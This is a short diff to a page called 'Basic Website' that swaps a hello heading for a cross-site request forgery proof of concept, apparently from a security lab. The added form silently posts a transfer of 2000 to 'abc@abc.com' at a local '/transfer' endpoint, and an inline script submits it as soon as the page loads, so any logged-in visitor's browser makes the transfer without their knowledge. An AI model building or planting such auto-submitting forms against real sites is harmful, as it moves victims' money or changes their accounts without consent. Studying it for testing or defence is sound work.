@@ -4,7 +4,12 @@
     <title>Basic Website</title>
 </head>
 <body>
-    <h1>Hello</h1>
-        <script> alert('hello')</script>
+    <form id="form" method="post" action="https://192.168.2.199:53864/transfer" enctype="text/plain">
+    <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="abc@abc.com">
+    <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" value="2000">
+    </form>
+    <script>
+        form.submit();
+    </script>
 </body>
 </html>
